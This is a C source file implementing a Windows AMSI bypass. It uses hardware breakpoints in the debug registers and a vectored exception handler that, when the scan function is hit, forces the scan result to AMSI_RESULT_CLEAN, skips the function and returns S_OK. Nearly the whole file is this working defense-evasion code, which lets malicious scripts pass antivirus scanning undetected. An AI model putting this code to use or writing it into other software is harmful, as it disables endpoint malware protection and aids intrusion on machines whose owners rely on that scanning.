#include "HardwareBPEngine.h"

ULONG InitializeHardwareBPEngine(PEXCEPTION_POINTERS ExceptionInfo)
{

	ULONG_PTR	ReturnAddress		= 0;
	PVOID		ExceptionAddress	= ExceptionInfo->ExceptionRecord->ExceptionAddress;
	PCONTEXT	Ctx					= ExceptionInfo->ContextRecord;
	PULONG		AmsiResult			= NULL;

	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP)
	{

		if (ExceptionAddress == Ctx->Dr0 ||
			ExceptionAddress == Ctx->Dr1 ||
			ExceptionAddress == Ctx->Dr2 ||
			ExceptionAddress == Ctx->Dr3)
		{

			AmsiResult = *(PULONG*)(Ctx->Rsp + 48); // not a good idea to hardcode it, but too lazy to fix this shit

			INFO("[0x%p] Original RIP", (PVOID)Ctx->Rip);
			INFO("[0x%p] Original RSP", (PVOID)Ctx->Rsp);

			*AmsiResult		= AMSI_RESULT_CLEAN;
			ReturnAddress	= *(ULONG_PTR*)Ctx->Rsp;
			Ctx->Rip		= ReturnAddress;
			Ctx->Rsp		+= 8;

			INFO("[0x%p] Modified RIP", (PVOID)Ctx->Rip);
			INFO("[0x%p] Modified RSP", (PVOID)Ctx->Rsp);

			Ctx->Rax = S_OK;

			return EXCEPTION_CONTINUE_EXECUTION;

		}

	}

	return EXCEPTION_CONTINUE_EXECUTION;

}

BOOLEAN SetHardwareBreakpoint
(
	_In_ PVOID FunctionAddress
)
{

	CONTEXT Ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };

	if (!GetThreadContext(GetCurrentThread(), &Ctx))
	{
		PRINT_ERROR("GetThreadContext");
		return FALSE;
	}

	if (!Ctx.Dr0)
	{
		Ctx.Dr0 = (DWORD64)FunctionAddress;
		Ctx.Dr7 |= 0x01;
		INFO("Dr0 Filled!");
	}
	else if (!Ctx.Dr1)
	{
		Ctx.Dr1 = (DWORD64)FunctionAddress;
		Ctx.Dr7 |= 0x04;
		INFO("Dr1 Filled!");
	}
	else if (!Ctx.Dr2)
	{
		Ctx.Dr2 = (DWORD64)FunctionAddress;
		Ctx.Dr7 |= 0x10;
		INFO("Dr2 Filled!");
	}
	else if (!Ctx.Dr3)
	{
		Ctx.Dr3 = (DWORD64)FunctionAddress;
		Ctx.Dr7 |= 0x40;
		INFO("Dr3 Filled!");
	}
	else
	{
		INFO("All Registers Filled!");
		return FALSE;
	}

	if (!SetThreadContext(GetCurrentThread(), &Ctx))
	{
		PRINT_ERROR("SetThreadContext");
		return FALSE;
	}

	return TRUE;

}

BOOLEAN RemoveHardwareBreakpoint(void)
{

	CONTEXT Ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };

	if (!GetThreadContext(GetCurrentThread(), &Ctx))
	{
		PRINT_ERROR("GetThreadContext");
		return FALSE;
	}

	if (Ctx.Dr0)
	{
		Ctx.Dr0 = 0x00;
		Ctx.Dr7 &= ~0x01;
		INFO("Dr0 Cleared!");
	}
	if (Ctx.Dr1)
	{
		Ctx.Dr1 = 0x00;
		Ctx.Dr7 &= ~0x04;
		INFO("Dr1 Cleared!");
	}
	if (Ctx.Dr2)
	{
		Ctx.Dr2 = 0x00;
		Ctx.Dr7 &= ~0x10;
		INFO("Dr2 Cleared!");
	}
	if (Ctx.Dr3)
	{
		Ctx.Dr3 = 0x00;
		Ctx.Dr7 &= ~0x40;
		INFO("Dr3 Cleared!");
	}
	else
	{
		INFO("No Breakpoints Set!");
		return FALSE;
	}

	if (!SetThreadContext(GetCurrentThread(), &Ctx))
	{
		PRINT_ERROR("SetThreadContext");
		return FALSE;
	}

	return TRUE;

}

LPCSTR GetAmsiResultValue(AMSI_RESULT Result)
{

	if (Result == AMSI_RESULT_CLEAN)
		return "AMSI_RESULT_CLEAN";

	if (Result == AMSI_RESULT_NOT_DETECTED)
		return "AMSI_RESULT_NOT_DETECTED";

	if (Result >= AMSI_RESULT_BLOCKED_BY_ADMIN_START && Result <= AMSI_RESULT_BLOCKED_BY_ADMIN_END)
		return "AMSI_RESULT_BLOCKED_BY_ADMIN";

	if (Result >= AMSI_RESULT_DETECTED)
		return "AMSI_RESULT_DETECTED";

	return "UNKOWN_AMSI_RESULT_VALUE";

}